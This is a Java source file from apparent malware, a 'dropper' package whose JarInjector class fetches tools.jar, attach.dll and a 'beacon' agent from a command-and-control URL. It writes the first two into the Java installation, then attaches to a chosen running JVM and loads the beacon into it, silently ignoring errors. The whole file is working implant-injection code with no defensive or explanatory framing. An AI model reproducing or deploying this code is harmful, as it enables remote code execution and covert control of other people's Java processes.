package dropper.injector;

import com.sun.tools.attach.*;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Collection;

import static dropper.utils.HttpUtil.downloadFileHttp;

public class JarInjector {
    public void setupEnv(String c2url) {
        String toolsJarPath = System.getProperty("java.home") + "\\lib\\tools.jar";
        String attachDllPath = System.getProperty("java.home") + "\\bin\\attach.dll";
        if (!Files.exists(Paths.get(toolsJarPath))) {
            File toolsJarFile = new File(toolsJarPath);
            try {
                if (toolsJarFile.createNewFile()) {
                    FileUtils.copyURLToFile(new URL(c2url + "/downloadResourceJ"), toolsJarFile);
                }
            } catch (IOException e) {
            }
        }

        if (!Files.exists(Paths.get(attachDllPath))) {
            File attachDllFile = new File(attachDllPath);
            try {
                if (attachDllFile.createNewFile()) {
                    FileUtils.copyURLToFile(new URL(c2url + "/downloadResourceB"), attachDllFile);
                }
            } catch (IOException e) {
            }
        }
    }

    public Collection<String> getInjectableJars() {
        Collection<VirtualMachineDescriptor> vms = VirtualMachine.list();
        Collection<String> vmNames = new ArrayList<>();
        for (VirtualMachineDescriptor vm : vms) {
            vmNames.add(vm.displayName());
        }
        return vmNames;
    }

    public boolean injectAgentToJar(String jarName, String filename, String c2url) {
        Collection<VirtualMachineDescriptor> vms = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : vms) {
            if (vmd.displayName().equals(jarName)) {
                try {
                    VirtualMachine jvm = VirtualMachine.attach(vmd.id());
                    String agentUrl = c2url + "/downloadBeacon";
                    File agent = new File(filename);
                    downloadFileHttp(agentUrl, agent.getPath());
                    jvm.loadAgent(agent.getPath(), c2url);
                    jvm.detach();
                    return true;
                } catch (AttachNotSupportedException e) {
                    return false;
                } catch (IOException e) {
                    return false;
                } catch (AgentLoadException e) {
                    return false;
                } catch (AgentInitializationException e) {
                    return false;
                }
            }
        }
        return false;
    }
}
